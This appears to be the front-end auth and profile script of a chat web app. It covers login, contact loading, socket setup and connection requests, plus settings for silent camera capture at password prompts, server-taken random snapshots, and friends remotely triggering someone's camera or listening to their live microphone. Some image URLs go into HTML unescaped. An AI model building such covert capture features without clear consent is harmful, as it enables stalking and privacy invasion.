/**
 * auth.js — Login, signup, logout, bootstrap, and connection handlers.
 */

// =============================================================================
// BOOTSTRAP — runs after successful login
// =============================================================================
async function bootstrapAfterLogin() {
  // Load connections (accepted contacts only for chat list)
  const connRes = await getMyConnections();
  if (connRes.code === 200) {
    State.contacts = connRes.Data.contacts || [];
    State.conversations = State.contacts.map(c => ({
      id: c.user.id,
      connectionId: c.connectionId,
      username: c.user.username,
      avatar: (c.user.avatar && c.user.avatar.length > 2)
        ? c.user.avatar
        : c.user.username.charAt(0).toUpperCase(),
      lastSeen: c.user.lastSeen,
      timestamp: 0,
      lastMessage: "",
      unread: 0,
      online: (State.onlineUsers && State.onlineUsers.includes(c.user.id)) || false,
    }));
  }

  // Load pending requests badge
  await refreshPendingRequests();

  // Sync full profile (livePhotoEnabled and capturedPhotos)
  const profileRes = await getMyProfile();
  if (profileRes.code === 200 && profileRes.Data?.user) {
    const user = profileRes.Data.user;
    if (user._id && !user.id) {
      user.id = user._id.toString();
    }
    State.currentUser = {
      ...State.currentUser,
      ...user
    };
    localStorage.setItem("SSC_USER", JSON.stringify(State.currentUser));
  }

  initChatList();

  // Load messages for each connection
  for (const conv of State.conversations) {
    const msgRes = await getMessages(conv.id, 50);
    if (msgRes.code === 200 && msgRes.Data?.messages?.length) {
      const msgs = msgRes.Data.messages;
      State.messages[conv.id] = msgs.map(m => ({
        id: m._id?.toString() || m.tempId,
        tempId: m.tempId,
        type: m.type,
        content: m.content,
        cover: m.cover || null,
        thumb: m.thumb || null,
        fileName: m.fileName || null,
        fileSize: m.fileSize || null,
        caption: m.caption || null,
        replyTo: m.replyTo || null,
        sender: m.from?.toString() === (State.currentUser.id || State.currentUser._id)?.toString() ? "me" : "other",
        user: m.from?.toString(),
        timestamp: m.createdAt || m.clientTime,
        reactions: m.reactions || {},
        status: m.status || { sent: true, delivered: false, seen: false },
        callType: m.callType,
        callStatus: m.callStatus,
        callRoomId: m.callRoomId,
        callExpiresAt: m.callExpiresAt,
        callDuration: m.callDuration,
        isDisappearing: m.isDisappearing || false,
        cameraFacing: m.cameraFacing || null,
        cameraFilter: m.cameraFilter || null
      })).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

      for (const msg of State.messages[conv.id]) {
        if (msg.id) State.messageIndex[msg.id] = conv.id;
      }

      const last = msgs[msgs.length - 1];
      conv.lastMessage = last.type === "text" ? last.content : `📷 ${last.type}`;
      conv.timestamp = last.createdAt || last.clientTime || Date.now();
    }
  }

  State.apiMessagesLoaded = true;

  // Disconnect any existing socket before creating a new one
  if (socket && socket.connected) {
    socket.removeAllListeners();
    socket.disconnect();
  }

  // Connect socket with JWT
  const token = TokenStore.getToken();
  socket = io(BACKEND_URL, {
    auth: { token },
    reconnection: true,
    reconnectionAttempts: Infinity,
    reconnectionDelay: 1000,
    reconnectionDelayMax: 10000,
    timeout: 10000,
    transports: ["websocket", "polling"]
  });

  initSocket();
  if (typeof CallManager !== "undefined") CallManager.wireSocket(socket);
  NetworkMonitor.isSocketConnected = socket.connected;
  renderChatList();

  if (typeof EmojiPanel !== "undefined" && EmojiPanel.loadCustomGifsAndTrending) {
    EmojiPanel.loadCustomGifsAndTrending(null, true);
  }
}

// =============================================================================
// PENDING REQUESTS — refresh badge & list
// =============================================================================
async function refreshPendingRequests() {
  const res = await getPendingRequests();
  if (res.code === 200) {
    State.pendingRequests = res.Data.requests || [];
    updateRequestsBadge();
  }
}

function updateRequestsBadge() {
  const badge = document.getElementById("requests-badge");
  const modalBadge = document.getElementById("modal-pending-badge");
  const count = State.pendingRequests.length;
  if (badge) {
    badge.textContent = count;
    badge.style.display = count > 0 ? "flex" : "none";
  }
  if (modalBadge) {
    modalBadge.textContent = count;
    modalBadge.style.display = count > 0 ? "inline-flex" : "none";
  }
}

// =============================================================================
// PEOPLE PANEL — search + send request + pending list
// =============================================================================
let searchTimeout = null;

function initPeoplePanel() {
  // Current user profile opens the Account & People Hub modal
  const userProfileHeader = document.querySelector(".user-profile");
  if (userProfileHeader) {
    userProfileHeader.style.cursor = "pointer";
    userProfileHeader.addEventListener("click", () => {
      openProfileModal("account");
    });
  }

  // Add People button opens the Account & People Hub modal
  const addPeopleBtn = document.getElementById("add-people-btn");
  if (addPeopleBtn) {
    addPeopleBtn.addEventListener("click", () => {
      openProfileModal("search");
    });
  }

  // Initialize the profile modal events
  initProfileModal();
}

async function runSearch(q) {
  const resultsEl = document.getElementById("people-search-results");
  resultsEl.innerHTML = `<div class="people-loading">Searching...</div>`;

  const res = await searchUsers(q);
  if (res.code !== 200 || !res.Data?.users?.length) {
    resultsEl.innerHTML = `<div class="people-empty">No users found</div>`;
    return;
  }

  resultsEl.innerHTML = "";
  res.Data.users.forEach(user => {
    const item = document.createElement("div");
    item.className = "people-item premium-card";
    item.innerHTML = `
      <div class="people-avatar">${user.username.charAt(0).toUpperCase()}</div>
      <div class="people-info">
        <span class="people-name">${sanitizeInput(user.username)}</span>
      </div>
      <button class="people-action-btn add-btn" data-id="${user._id}">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
          <line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/>
        </svg>
        Add
      </button>`;
    item.querySelector(".add-btn").addEventListener("click", async (e) => {
      const btn = e.currentTarget;
      btn.disabled = true;
      btn.textContent = "Sending...";
      const r = await sendConnectionRequest(user._id);
      if (r.code === 201) {
        btn.textContent = "✓ Sent";
        btn.classList.add("sent");
        showToast(`Request sent to ${user.username}`, "success");
        // Notify receiver via socket in real-time
        socket?.emit("connection:request", { to: user._id });
      } else {
        btn.disabled = false;
        btn.textContent = "Add";
        showToast(r.Data?.message || "Failed to send request", "error");
      }
    });
    resultsEl.appendChild(item);
  });
}

function formatRelativeTime(date) {
  const diffMs = Date.now() - date.getTime();
  const diffMins = Math.floor(diffMs / 60000);
  if (diffMins < 1) return "Just now";
  if (diffMins < 60) return `${diffMins}m ago`;
  const diffHours = Math.floor(diffMins / 60);
  if (diffHours < 24) return `${diffHours}h ago`;
  const diffDays = Math.floor(diffHours / 24);
  return `${diffDays}d ago`;
}

function openLogLightbox(url, timestamp) {
  const lightbox = document.createElement("div");
  lightbox.className = "log-lightbox-overlay";
  lightbox.innerHTML = `
    <div class="lightbox-close">&times;</div>
    <div class="lightbox-content">
      <img src="${url}" alt="Security Log Image" class="lightbox-img">
      <div class="lightbox-meta">Captured on ${new Date(timestamp).toLocaleString()}</div>
    </div>
  `;
  lightbox.querySelector(".lightbox-close").onclick = () => {
    lightbox.classList.remove("active");
    setTimeout(() => lightbox.remove(), 300);
  };
  lightbox.onclick = (e) => {
    if (e.target === lightbox) {
      lightbox.classList.remove("active");
      setTimeout(() => lightbox.remove(), 300);
    }
  };
  document.body.appendChild(lightbox);
  setTimeout(() => lightbox.classList.add("active"), 10);
}

function renderPeopleTab(tab) {
  const container = document.getElementById("people-tab-content");
  if (!container) return;
  container.innerHTML = "";

  if (tab === "search") {
    container.innerHTML = `
      <div class="modal-search-box">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
        <input type="text" id="people-search-input" placeholder="Search people by username...">
      </div>
      <div id="people-search-results" class="modal-list-grid"></div>
    `;

    const searchInput = container.querySelector("#people-search-input");
    const resultsEl = container.querySelector("#people-search-results");

    searchInput.addEventListener("input", () => {
      clearTimeout(searchTimeout);
      const q = searchInput.value.trim();
      if (q.length < 2) {
        resultsEl.innerHTML = "";
        return;
      }
      searchTimeout = setTimeout(() => runSearch(q), 400);
    });

    resultsEl.innerHTML = `
      <div class="people-empty">
        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="opacity: 0.5; margin-bottom: 8px;">
          <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
        </svg>
        <p style="margin: 0; font-size: 14px; font-weight: 500;">Discover People</p>
        <small style="color: var(--text-secondary); font-size: 12px;">Search by username above to find connections</small>
      </div>`;

  } else if (tab === "pending") {
    if (!State.pendingRequests.length) {
      container.innerHTML = `
        <div class="people-empty">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="opacity: 0.5; margin-bottom: 8px;">
            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/>
          </svg>
          <p style="margin: 0; font-size: 14px; font-weight: 500;">No pending requests</p>
        </div>`;
      return;
    }
    
    container.innerHTML = `<div class="modal-list-grid"></div>`;
    const grid = container.querySelector(".modal-list-grid");
    
    State.pendingRequests.forEach(req => {
      const item = document.createElement("div");
      item.className = "people-item premium-card";
      item.innerHTML = `
        <div class="people-avatar">${req.from.username.charAt(0).toUpperCase()}</div>
        <div class="people-info">
          <span class="people-name">${sanitizeInput(req.from.username)}</span>
          <span class="people-meta">wants to connect</span>
        </div>
        <div class="request-actions">
          <button class="people-action-btn accept-btn" data-id="${req.connectionId}">Accept</button>
          <button class="people-action-btn reject-btn" data-id="${req.connectionId}">✕</button>
        </div>`;

      item.querySelector(".accept-btn").addEventListener("click", async (e) => {
        const btn = e.currentTarget;
        btn.disabled = true;
        btn.textContent = "...";
        const r = await respondToRequest(req.connectionId, "accept");
        if (r.code === 200) {
          showToast(`Connected with ${req.from.username}!`, "success");
          socket?.emit("connection:accepted", { to: req.from.id });
          State.pendingRequests = State.pendingRequests.filter(r => r.connectionId !== req.connectionId);
          updateRequestsBadge();
          renderPeopleTab("pending");
          await bootstrapAfterLogin();
        } else {
          btn.disabled = false;
          btn.textContent = "Accept";
        }
      });

      item.querySelector(".reject-btn").addEventListener("click", async () => {
        const r = await respondToRequest(req.connectionId, "reject");
        if (r.code === 200) {
          State.pendingRequests = State.pendingRequests.filter(r => r.connectionId !== req.connectionId);
          updateRequestsBadge();
          renderPeopleTab("pending");
        }
      });

      grid.appendChild(item);
    });

  } else if (tab === "contacts") {
    if (!State.contacts.length) {
      container.innerHTML = `
        <div class="people-empty">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="opacity: 0.5; margin-bottom: 8px;">
            <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/>
          </svg>
          <p style="margin: 0; font-size: 14px; font-weight: 500;">No connections yet</p>
          <small style="color: var(--text-secondary); font-size: 12px;">Search for users in Discover to connect</small>
        </div>`;
      return;
    }
    
    container.innerHTML = `<div class="modal-list-grid"></div>`;
    const grid = container.querySelector(".modal-list-grid");
    
    State.contacts.forEach(c => {
      const item = document.createElement("div");
      item.className = "people-item premium-card";
      const conv = State.conversations.find(cv => cv.id === c.user.id);
      item.innerHTML = `
        <div class="people-avatar ${conv?.online ? "online" : ""}">${c.user.username.charAt(0).toUpperCase()}</div>
        <div class="people-info">
          <span class="people-name">${sanitizeInput(c.user.username)}</span>
          <span class="people-meta">${conv?.online ? "Online" : "Connected"}</span>
        </div>
        <button class="people-action-btn chat-btn" data-id="${c.user.id}">Chat</button>`;
      
      item.querySelector(".chat-btn").addEventListener("click", () => {
        closeProfileModal();
        openChat(c.user.id);
      });
      grid.appendChild(item);
    });

  } else if (tab === "moments") {
    const momentsBadge = document.getElementById("modal-moments-badge");
    if (momentsBadge) {
      momentsBadge.classList.remove("dot");
      momentsBadge.textContent = "";
    }
    renderMomentsTab(container);

  } else if (tab === "account") {
    const user = State.currentUser || {};
    container.innerHTML = `
      <div class="profile-section-title-wrap" style="margin-bottom: 24px;">
        <h2 class="profile-section-title">Account Settings</h2>
      </div>
      <div class="profile-section-cards-grid">
        <div class="profile-content-card">
          <h3>User Info</h3>
          <div class="profile-info-item">
            <label>Username</label>
            <input type="text" id="profile-modal-info-username" value="${sanitizeInput(user.username || "")}" readonly>
          </div>
          <div class="profile-info-item">
            <label>Email Address</label>
            <input type="text" id="profile-modal-info-email" value="${sanitizeInput(user.email || "")}" readonly>
          </div>
        </div>
        <div class="profile-content-card">
          <h3>Security Capture</h3>
          <div class="settings-row">
            <div class="settings-label-wrap">
              <span class="settings-label-main">Live Photo Capture</span>
              <span class="settings-label-sub">Silently log camera photo on password prompts</span>
            </div>
            <label class="switch">
              <input type="checkbox" id="profile-modal-live-photo-toggle" ${user.livePhotoEnabled ? "checked" : ""}>
              <span class="slider"></span>
            </label>
          </div>
        </div>
      </div>
    `;

    container.querySelector("#profile-modal-live-photo-toggle").addEventListener("change", async (e) => {
      const enabled = e.target.checked;
      const res = await updateProfile({ livePhotoEnabled: enabled });
      if (res.code === 200 && res.Data?.status) {
        State.currentUser.livePhotoEnabled = enabled;
        localStorage.setItem("SSC_USER", JSON.stringify(State.currentUser));
        showToast(`Live photo capture ${enabled ? "enabled" : "disabled"}`, "success");
      } else {
        e.target.checked = !enabled;
        showToast("Failed to update profile setting", "error");
      }
    });

  } else if (tab === "whitelist") {
    const user = State.currentUser || {};
    container.innerHTML = `
      <div class="profile-section-title-wrap" style="margin-bottom: 24px;">
        <h2 class="profile-section-title">Privacy & Permissions Whitelist</h2>
      </div>
      <div class="profile-content-card">
        <div class="settings-row" style="margin-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 16px;">
          <div class="settings-label-wrap">
            <span class="settings-label-main">Spontaneous Moments Sharing</span>
            <span class="settings-label-sub">Allow server to take random snaps and share with whitelisted friends</span>
          </div>
          <label class="switch">
            <input type="checkbox" id="profile-modal-random-snapshot-toggle" ${user.randomSnapshotEnabled ? "checked" : ""}>
            <span class="slider"></span>
          </label>
        </div>
        <div id="profile-modal-whitelist-container" style="${user.randomSnapshotEnabled ? "display: block;" : "display: none;"}">
          <h3 style="font-size: 14px; margin-bottom: 12px; color: var(--text-secondary);">Share Snapshots With</h3>
          <div class="profile-modal-whitelist-list" id="profile-modal-whitelist-list">
          </div>
        </div>
      </div>

      <div class="profile-content-card" style="margin-top: 24px;">
        <div class="settings-row" style="margin-bottom: 20px; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 16px;">
          <div class="settings-label-wrap">
            <span class="settings-label-main">Live Voice Listening</span>
            <span class="settings-label-sub">Allow whitelisted friends to listen to your live microphone voice</span>
          </div>
          <label class="switch">
            <input type="checkbox" id="profile-modal-live-voice-toggle" ${user.liveVoiceEnabled ? "checked" : ""}>
            <span class="slider"></span>
          </label>
        </div>
        <div id="profile-modal-voice-whitelist-container" style="${user.liveVoiceEnabled ? "display: block;" : "display: none;"}">
          <h3 style="font-size: 14px; margin-bottom: 12px; color: var(--text-secondary);">Allow Live Voice Listening to</h3>
          <div class="profile-modal-whitelist-list" id="profile-modal-voice-whitelist-list">
          </div>
        </div>
      </div>
    `;

    renderModalWhitelist(container.querySelector("#profile-modal-whitelist-list"));
    renderModalVoiceWhitelist(container.querySelector("#profile-modal-voice-whitelist-list"));

    container.querySelector("#profile-modal-random-snapshot-toggle").addEventListener("change", async (e) => {
      const enabled = e.target.checked;
      const res = await updateProfile({ randomSnapshotEnabled: enabled });
      if (res.code === 200 && res.Data?.status) {
        State.currentUser.randomSnapshotEnabled = enabled;
        localStorage.setItem("SSC_USER", JSON.stringify(State.currentUser));
        const whitelistContainer = container.querySelector("#profile-modal-whitelist-container");
        if (whitelistContainer) {
          whitelistContainer.style.display = enabled ? "block" : "none";
        }
        if (enabled) {
          renderModalWhitelist(container.querySelector("#profile-modal-whitelist-list"));
        }
        showToast(`Spontaneous moments ${enabled ? "enabled" : "disabled"}`, "success");
      } else {
        e.target.checked = !enabled;
        showToast("Failed to update profile setting", "error");
      }
    });

    container.querySelector("#profile-modal-live-voice-toggle").addEventListener("change", async (e) => {
      const enabled = e.target.checked;
      const res = await updateProfile({ liveVoiceEnabled: enabled });
      if (res.code === 200 && res.Data?.status) {
        State.currentUser.liveVoiceEnabled = enabled;
        localStorage.setItem("SSC_USER", JSON.stringify(State.currentUser));
        const voiceWhitelistContainer = container.querySelector("#profile-modal-voice-whitelist-container");
        if (voiceWhitelistContainer) {
          voiceWhitelistContainer.style.display = enabled ? "block" : "none";
        }
        if (enabled) {
          renderModalVoiceWhitelist(container.querySelector("#profile-modal-voice-whitelist-list"));
        }
        showToast(`Live Voice Listening ${enabled ? "enabled" : "disabled"}`, "success");
      } else {
        e.target.checked = !enabled;
        showToast("Failed to update profile setting", "error");
      }
    });

  } else if (tab === "logs") {
    container.innerHTML = `
      <div class="profile-section-title-wrap" style="margin-bottom: 24px;">
        <h2 class="profile-section-title">Security Logs</h2>
      </div>
      <div class="profile-content-card">
        <h3 style="margin-bottom: 12px;">Silent Log Captures</h3>
        <div class="profile-modal-logs-gallery" id="profile-modal-logs-gallery">
        </div>
      </div>
    `;
    renderModalLogs(container.querySelector("#profile-modal-logs-gallery"));
  }
}

async function renderMomentsTab(container) {
  container.innerHTML = `
    <div class="moments-loading-container">
      <div class="moments-spinner"></div>
      <p style="color: var(--text-secondary); font-size: 13px; margin-top: 8px;">Fetching moments...</p>
    </div>
  `;

  const res = await getAllFriendsMoments();
  if (res?.code !== 200) {
    container.innerHTML = `<div class="people-empty">Failed to load moments</div>`;
    return;
  }

  const momentsObj = res.Data?.moments || {};
  const friendsSharing = Object.values(momentsObj);

  if (!State.friendMoments) State.friendMoments = {};
  for (const fId in momentsObj) {
    State.friendMoments[fId] = momentsObj[fId].moments;
  }

  if (friendsSharing.length === 0) {
    container.innerHTML = `
      <div class="people-empty">
        <p style="margin: 0; font-size: 14px; font-weight: 500;">No shared moments</p>
      </div>`;
    return;
  }

  let activeFriendId = State.selectedMomentFriendId;
  if (!activeFriendId || !momentsObj[activeFriendId]) {
    activeFriendId = friendsSharing[0].user.id;
    State.selectedMomentFriendId = activeFriendId;
  }

  container.innerHTML = `
    <div class="moments-tab-container">
      <div class="moments-stories-row"></div>
      <div class="moments-gallery-section">
        <div class="moments-gallery-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; width: 100%;">
          <span class="moments-gallery-title" style="margin: 0;"></span>
          <button class="modal-moment-request-btn" id="modal-moment-request-btn" style="display: none;">
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="margin-right: 4px;">
              <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
              <circle cx="12" cy="13" r="4"/>
            </svg>
            Click Snapshot
          </button>
        </div>
        <div class="moments-gallery-grid"></div>
      </div>
    </div>
  `;

  const storiesRow = container.querySelector(".moments-stories-row");
  const galleryTitle = container.querySelector(".moments-gallery-title");
  const galleryGrid = container.querySelector(".moments-gallery-grid");

  const requestBtn = container.querySelector("#modal-moment-request-btn");
  if (requestBtn) {
    requestBtn.addEventListener("click", () => {
      const friendId = requestBtn.dataset.friendId;
      if (!friendId) return;

      requestBtn.disabled = true;
      const originalText = requestBtn.innerHTML;
      requestBtn.innerHTML = `<div class="spinner-ring" style="width:12px;height:12px;border-width:1.5px;border-top-color:#fff;margin-right:4px;"></div> Capturing...`;

      showCameraSelector(
        async (requestType, facingMode) => {
          if (requestType === "photo") {
            socket.emit("moment:request", { to: friendId, camera: facingMode, type: requestType });
            showToast("Requesting snapshot...", "info");
          } else {
            showToast("Requesting live video preview...", "info");
            const friendName = galleryTitle ? galleryTitle.textContent.replace("'s Snaps", "") : "Friend";
            showLiveVideoPreview(friendName, () => {
              socket.emit("moment:stream_stop", { to: friendId });
              if (typeof window.stopReceivingVideoStream === "function") {
                window.stopReceivingVideoStream();
              }
            });
            if (typeof window.startReceivingVideoStream === "function") {
              await window.startReceivingVideoStream(friendId);
            }
            socket.emit("moment:request", { to: friendId, camera: facingMode, type: requestType });
          }
          setTimeout(() => {
            if (requestBtn.disabled) {
              requestBtn.disabled = false;
              requestBtn.innerHTML = originalText;
            }
          }, 5000);
        },
        () => {
          requestBtn.disabled = false;
          requestBtn.innerHTML = originalText;
        }
      );
    });
  }

  friendsSharing.forEach((item) => {
    const friend = item.user;
    const itemEl = document.createElement("div");
    itemEl.className = `story-item ${friend.id === activeFriendId ? "active" : ""}`;
    itemEl.innerHTML = `
      <div class="story-avatar-wrap">
        <div class="story-avatar">${friend.username.charAt(0).toUpperCase()}</div>
        ${friend.online ? `<span class="story-online-badge"></span>` : ""}
      </div>
      <span class="story-username">${sanitizeInput(friend.username)}</span>
    `;
    itemEl.addEventListener("click", () => {
      State.selectedMomentFriendId = friend.id;
      container.querySelectorAll(".story-item").forEach(el => el.classList.remove("active"));
      itemEl.classList.add("active");
      renderFriendGallery(friend.id, momentsObj, galleryTitle, galleryGrid);
    });
    storiesRow.appendChild(itemEl);
  });

  renderFriendGallery(activeFriendId, momentsObj, galleryTitle, galleryGrid);
}

function renderFriendGallery(friendId, momentsObj, titleEl, gridEl) {
  const data = momentsObj[friendId];
  if (!data) return;

  titleEl.textContent = `${data.user.username}'s Snaps`;

  const requestBtn = document.getElementById("modal-moment-request-btn");
  if (requestBtn) {
    requestBtn.dataset.friendId = friendId;
    if (data.user.online) {
      requestBtn.style.display = "flex";
      requestBtn.disabled = false;
      requestBtn.title = `Request a new snapshot from ${data.user.username}`;
    } else {
      requestBtn.style.display = "flex";
      requestBtn.disabled = true;
      requestBtn.title = `${data.user.username} is offline`;
    }
  }

  gridEl.innerHTML = "";
  const snaps = data.moments || [];
  if (snaps.length === 0) {
    gridEl.innerHTML = `<div class="gallery-empty"><p>No snapshots</p></div>`;
    return;
  }

  snaps.forEach((snap) => {
    const card = document.createElement("div");
    card.className = "moment-gallery-card premium-card";
    const timeStr = formatRelativeTime(new Date(snap.createdAt));
    card.innerHTML = `
      <img src="${snap.url}" alt="Moment Snapshot" class="moment-gallery-img">
      <div class="moment-gallery-overlay"><span class="moment-gallery-time">${timeStr}</span></div>
    `;
    card.addEventListener("click", () => {
      if (typeof openMomentsCarousel === "function") openMomentsCarousel(friendId);
    });
    gridEl.appendChild(card);
  });
}

function openPeoplePanel() {
  openProfileModal("search");
}

// =============================================================================
// PROFILE MODAL (ACCOUNT HUB) HANDLERS
// =============================================================================
function initProfileModal() {
  const closeBtn = document.getElementById("profile-modal-close-btn");
  if (closeBtn) {
    closeBtn.addEventListener("click", closeProfileModal);
  }

  const modalOverlay = document.getElementById("profile-modal");
  if (modalOverlay) {
    modalOverlay.addEventListener("click", (e) => {
      if (e.target === modalOverlay) {
        closeProfileModal();
      }
    });
  }

  document.querySelectorAll(".profile-nav-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      switchProfileModalSection(btn.dataset.section);
    });
  });

  const logoutBtn = document.getElementById("profile-modal-logout-btn");
  if (logoutBtn) {
    logoutBtn.addEventListener("click", () => {
      closeProfileModal();
      if (typeof logout === "function") logout();
    });
  }
}

function openProfileModal(defaultSection = "search") {
  const modal = document.getElementById("profile-modal");
  if (!modal) return;

  const user = State.currentUser || {};
  document.getElementById("profile-modal-avatar-letter").textContent = user.username?.charAt(0).toUpperCase() || "U";
  document.getElementById("profile-modal-username").textContent = sanitizeInput(user.username || "User");
  document.getElementById("profile-modal-email").textContent = sanitizeInput(user.email || "");

  updateRequestsBadge();
  switchProfileModalSection(defaultSection);

  modal.style.display = "flex";
  setTimeout(() => modal.classList.add("active"), 10);
}

function closeProfileModal() {
  const modal = document.getElementById("profile-modal");
  if (!modal) return;
  modal.classList.remove("active");
  setTimeout(() => {
    modal.style.display = "none";
  }, 300);
}

function switchProfileModalSection(sectionName) {
  document.querySelectorAll(".profile-nav-btn").forEach(btn => {
    btn.classList.toggle("active", btn.dataset.section === sectionName);
  });
  renderPeopleTab(sectionName);
}

function renderModalWhitelist(whitelistList) {
  if (!whitelistList) return;
  whitelistList.innerHTML = "";
  const user = State.currentUser || {};
  if (!State.contacts.length) {
    whitelistList.innerHTML = `<p style="font-size:12px;color:var(--text-secondary);text-align:center;margin:16px 0;">No connections to share with yet.</p>`;
    return;
  }

  const allowed = (user.randomSnapshotAllowedFriends || []).map(id => id.toString());
  State.contacts.forEach(c => {
    const row = document.createElement("div");
    row.className = "whitelist-row";
    const isWhitelisted = allowed.includes(c.user.id?.toString());
    row.innerHTML = `
      <div class="whitelist-user">
        <div class="whitelist-avatar">${c.user.username.charAt(0).toUpperCase()}</div>
        <span class="whitelist-username">${sanitizeInput(c.user.username)}</span>
      </div>
      <label class="switch mini-switch">
        <input type="checkbox" class="modal-whitelist-friend-toggle" data-friend-id="${c.user.id}" ${isWhitelisted ? "checked" : ""}>
        <span class="slider"></span>
      </label>
    `;
    
    row.querySelector(".modal-whitelist-friend-toggle").addEventListener("change", async (e) => {
      const friendId = e.target.dataset.friendId;
      const checked = e.target.checked;
      let allowedList = State.currentUser.randomSnapshotAllowedFriends || [];
      allowedList = allowedList.map(id => id.toString());
      const idx = allowedList.indexOf(friendId);
      if (checked) { if (idx === -1) allowedList.push(friendId); } else { if (idx !== -1) allowedList.splice(idx, 1); }

      const res = await updateProfile({ randomSnapshotAllowedFriends: allowedList });
      if (res.code === 200 && res.Data?.status) {
        State.currentUser.randomSnapshotAllowedFriends = allowedList;
        localStorage.setItem("SSC_USER", JSON.stringify(State.currentUser));
        showToast(`Snapshot sharing updated`, "success");
      } else {
        e.target.checked = !checked;
        showToast("Failed to update whitelist", "error");
      }
    });
    whitelistList.appendChild(row);
  });
}

function renderModalVoiceWhitelist(whitelistList) {
  if (!whitelistList) return;
  whitelistList.innerHTML = "";
  const user = State.currentUser || {};
  if (!State.contacts.length) {
    whitelistList.innerHTML = `<p style="font-size:12px;color:var(--text-secondary);text-align:center;margin:16px 0;">No connections to share with yet.</p>`;
    return;
  }

  const allowed = (user.liveVoiceAllowedFriends || []).map(id => id.toString());
  State.contacts.forEach(c => {
    const row = document.createElement("div");
    row.className = "whitelist-row";
    const isWhitelisted = allowed.includes(c.user.id?.toString());
    row.innerHTML = `
      <div class="whitelist-user">
        <div class="whitelist-avatar">${c.user.username.charAt(0).toUpperCase()}</div>
        <span class="whitelist-username">${sanitizeInput(c.user.username)}</span>
      </div>
      <label class="switch mini-switch">
        <input type="checkbox" class="modal-voice-whitelist-friend-toggle" data-friend-id="${c.user.id}" ${isWhitelisted ? "checked" : ""}>
        <span class="slider"></span>
      </label>
    `;
    
    row.querySelector(".modal-voice-whitelist-friend-toggle").addEventListener("change", async (e) => {
      const friendId = e.target.dataset.friendId;
      const checked = e.target.checked;
      let allowedList = State.currentUser.liveVoiceAllowedFriends || [];
      allowedList = allowedList.map(id => id.toString());
      const idx = allowedList.indexOf(friendId);
      if (checked) { if (idx === -1) allowedList.push(friendId); } else { if (idx !== -1) allowedList.splice(idx, 1); }

      const res = await updateProfile({ liveVoiceAllowedFriends: allowedList });
      if (res.code === 200 && res.Data?.status) {
        State.currentUser.liveVoiceAllowedFriends = allowedList;
        localStorage.setItem("SSC_USER", JSON.stringify(State.currentUser));
        showToast(`Voice listening permission updated`, "success");
      } else {
        e.target.checked = !checked;
        showToast("Failed to update whitelist", "error");
      }
    });
    whitelistList.appendChild(row);
  });
}

function renderModalLogs(logsGallery) {
  if (!logsGallery) return;
  logsGallery.innerHTML = "";
  const photos = State.currentUser?.capturedPhotos || [];
  if (!photos.length) {
    logsGallery.innerHTML = `<div class="gallery-empty" style="grid-column: span 3;"><p>No security log photos yet.</p></div>`;
    return;
  }
  photos.forEach((photo) => {
    const photoCard = document.createElement("div");
    photoCard.className = "log-photo-card";
    photoCard.innerHTML = `
      <img src="${photo.url}" alt="Security Log" class="log-thumbnail">
      <div class="log-card-overlay"><span class="log-time">${formatRelativeTime(new Date(photo.createdAt))}</span></div>
    `;
    photoCard.addEventListener("click", () => openLogLightbox(photo.url, photo.createdAt));
    logsGallery.appendChild(photoCard);
  });
}



function setButtonLoading(btn, text) {
  btn.dataset.originalText = btn.textContent;
  btn.textContent = text;
  btn.disabled = true;
}
function resetButtonLoading(btn) {
  btn.textContent = btn.dataset.originalText;
  btn.disabled = false;
}

// =============================================================================
// AUTH FORMS
// =============================================================================
function handelAuthForm() {
  const loginForm = document.getElementById("login-form");
  const signupForm = document.getElementById("signup-form");

  /* ─── LOGIN ─── */
  loginForm.addEventListener("submit", async (e) => {
    e.preventDefault();
    const identifier = document.getElementById("login-username").value.trim();
    const password = document.getElementById("login-password").value;
    const submitBtn = loginForm.querySelector(".btn-primary");

    if (!identifier || !password) { showToast("Please fill in all fields", "error"); return; }

    setButtonLoading(submitBtn, "Verifying...");
    try {
      const response = await loginuser({ identifier, password });
      if (response.code !== 200) {
        showToast(response.Data?.message || "Login failed", "error");
        resetButtonLoading(submitBtn);
        return;
      }
      State.currentUser = {
        id: response.Data.user.id,
        username: response.Data.user.username,
        avatar: response.Data.user.avatar,
        email: response.Data.user.email,
      };
      localStorage.setItem("SSC_USER", JSON.stringify(State.currentUser));
      const oldVersion = localStorage.getItem("app_version");
      if (response.Data.version !== oldVersion) {
        localStorage.setItem("app_version", response.Data.version);
        if (oldVersion !== null) {
          await fetch("/auth/flush-redis", { method: "POST" });
        }
      }

      // Link Telegram if running inside Telegram
      const tg = window.Telegram?.WebApp;
      if (tg?.initDataUnsafe?.user?.id) {
        await linkTelegramAccount(tg.initDataUnsafe.user.id);
      }

      await bootstrapAfterLogin();
      resetButtonLoading(submitBtn);
      showToast("Logged in successfully!", "success");
      showChatScreen();
      startTimeTicker();
    } catch (err) {
      resetButtonLoading(submitBtn);
      showToast("Server error. Please try again.", "error");
    }
  });

  /* ─── SIGNUP ─── */
